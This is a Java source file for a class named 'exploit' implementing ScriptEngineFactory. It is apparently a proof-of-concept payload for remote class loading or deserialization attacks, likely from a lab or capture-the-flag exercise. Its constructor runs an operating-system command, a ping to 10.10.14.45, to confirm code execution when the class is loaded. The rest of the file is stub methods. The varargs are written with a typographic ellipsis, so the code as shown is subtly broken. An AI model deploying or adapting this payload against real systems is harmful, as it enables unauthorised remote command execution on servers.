import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;
public class exploit implements ScriptEngineFactory {
public exploit() {
try {
Runtime.getRuntime().exec("ping 10.10.14.45");
} catch (IOException e) {
e.printStackTrace();
}
}
@Override
public String getEngineName() {
return null;
}
@Override
public String getEngineVersion() {
return null;
}
@Override
public List<String> getExtensions() {
return null;
}
@Override
public List<String> getMimeTypes() {
return null;
}
@Override
public List<String> getNames() {
return null;
}
@Override
public String getLanguageName() {
return null;
}
@Override
public String getLanguageVersion() {
return null;
}
@Override
public Object getParameter(String key) {
return null;
}
@Override
public String getMethodCallSyntax(String obj, String m, String… args) {
return null;
}
@Override
public String getOutputStatement(String toDisplay) {
return null;
}
@Override
public String getProgram(String… statements) {
return null;
}
@Override
public ScriptEngine getScriptEngine() {
return null;
}
}